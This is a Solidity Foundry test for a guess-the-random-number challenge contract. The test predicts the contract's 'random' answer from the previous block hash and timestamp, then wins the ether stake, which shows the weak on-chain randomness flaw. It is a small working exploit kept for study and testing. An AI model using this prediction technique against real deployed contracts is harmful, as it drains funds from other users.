
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {
    GuessTheRandomNumberChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber > block.number + 1);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 prevBlockNumber = block.number - 1;
        bytes32 prevBlockHash = blockhash(prevBlockNumber);

        uint8 predictedAnswer = uint8(
            uint256(keccak256(abi.encodePacked(prevBlockHash, block.timestamp)))
        );

        vm.deal(address(this), 10 ether);

        _contractUnderTest.guess{value: 1 ether}(predictedAnswer);

        assertTrue(_contractUnderTest.isComplete(), "Randomness should be predictable given block state");
    }
}
